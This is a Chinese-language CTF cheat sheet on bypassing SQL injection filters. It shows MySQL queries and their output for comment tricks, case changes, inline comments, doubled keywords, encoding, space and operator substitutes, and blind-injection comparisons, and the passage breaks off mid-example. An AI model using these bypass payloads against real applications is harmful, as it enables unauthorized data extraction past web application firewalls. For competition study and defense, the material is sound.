        <content type="html"><![CDATA[<h1 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>SQL在CTF每一次比赛中基本上都会出现，所以有了这一篇总结，防忘，最后更新于2018&#x2F;10&#x2F;11。</p><p>简而言之：SQL注入用户输入的数据变成了代码被执行</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">string</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select id,no from user where id=&quot;</span> + id;</span><br></pre></td></tr></table></figure><blockquote><p>我们希望用户输入的 id 的值，仅仅是一个字符串，传入数据库执行，但是当输入了： 2 or 1&#x3D;1 时，其中的 or 1&#x3D;1 是作为了 sql语句 来执行的。</p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="注释符号绕过"><a href="#注释符号绕过" class="headerlink" title="注释符号绕过"></a>注释符号绕过</h3><p>常用的注释符有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 注释内容</span><br><span class="line"># 注释内容</span><br><span class="line">/*注释内容*/</span><br><span class="line">;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="comment">-- where id = 1;</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> user2    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users # <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> user2    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">3</span> <span class="comment">/*+1*/</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>常用于 <code>waf</code>的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。<br>例如：waf过滤了关键字<code>select</code>，可以尝试使用<code>Select</code>等绕过。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">#大小写绕过</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="comment">/*!select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><h3 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h3><p>在某一些简单的<code>waf</code>中，将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经过<code>waf</code>的处理之后又变成<code>select</code>，达到绕过的要求。</p><h3 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h3><ul><li>十六进制绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="number">0x7465737431</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><ul><li>ascii编码绕过<br><code>Test</code> 等价于<br><code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code><br>tip:好像新版mysql不能用了</li></ul><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>一般绕过空格过滤的方法有以下几种方法来取代空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/**/</span><br><span class="line">()</span><br><span class="line">回车(url编码中的%0a)</span><br><span class="line">`(tap键上面的按钮)</span><br><span class="line">tap</span><br><span class="line">两个空格</span><br></pre></td></tr></table></figure><p>实例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> user2    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注意括号中不能含有<span class="operator">*</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>(id)<span class="keyword">from</span>(users);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">*</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">from</span> </span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> users</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">where</span> </span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>`id`<span class="keyword">from</span>`users`<span class="keyword">where</span>`id`<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+</span></span><br></pre></td></tr></table></figure><h3 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and = &amp;&amp;</span><br><span class="line">or = ||</span><br><span class="line">xor = | # 异或</span><br><span class="line">not = !</span><br></pre></td></tr></table></figure><h3 id="过滤等号-绕过"><a href="#过滤等号-绕过" class="headerlink" title="过滤等号&#x3D;绕过"></a>过滤等号&#x3D;绕过</h3><ul><li>不加<code>通配符</code>的<code>like</code>执行的效果和<code>=</code>一致，所以可以用来绕过。</li></ul><p>正常加上通配符的<code>like</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="keyword">like</span> &quot;test%&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> test3    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><p>不加上通配符的<code>like</code>可以用来取代<code>=</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">like</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><ul><li>rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来<br>用来取代<code>=</code>时，<code>rlike</code>的用法和上面的<code>like</code>一样，没有通配符效果和<code>=</code>一样</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id rlike <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><ul><li>regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id regexp <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><ul><li>使用大小于号来绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">&gt;</span> <span class="number">1</span> <span class="keyword">and</span> id <span class="operator">&lt;</span> <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> user2    <span class="operator">|</span> pass1    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><ul><li>&lt;&gt; 等价于 !&#x3D;<br>所以在前面再加一个<code>!</code>结果就是等号了</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="operator">!</span>(id <span class="operator">&lt;&gt;</span> <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>等号绕过也可以使用strcmp(str1,str2)函数、between关键字等，具体可以参考后面的<code>过滤大小于号绕过</code></p><h3 id="过滤大小于号绕过"><a href="#过滤大小于号绕过" class="headerlink" title="过滤大小于号绕过"></a>过滤大小于号绕过</h3><p>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。但是如果过滤了大小于号的话，那就凉凉。怎么会呢，可以使用以下的关键字来绕过</p><ul><li>greatest(n1, n2, n3…):返回n中的最大值</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(username,<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>)<span class="operator">=</span><span class="number">116</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure><ul><li><p>least(n1,n2,n3…):返回n中的最小值</p></li><li><p>strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> strcmp(ascii(substr(username,<span class="number">1</span>,<span class="number">1</span>)),<span class="number">117</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> strcmp(ascii(substr(username,<span class="number">1</span>,<span class="number">1</span>)),<span class="number">116</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><ul><li>in关键字</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> substr(username,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> (<span class="string">&#x27;t&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> substr(username,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> (<span class="string">&#x27;y&#x27;</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><ul><li>between a and b:范围在a-b之间</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> test1    <span class="operator">|</span> pass     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> user2    <span class="operator">|</span> pass1    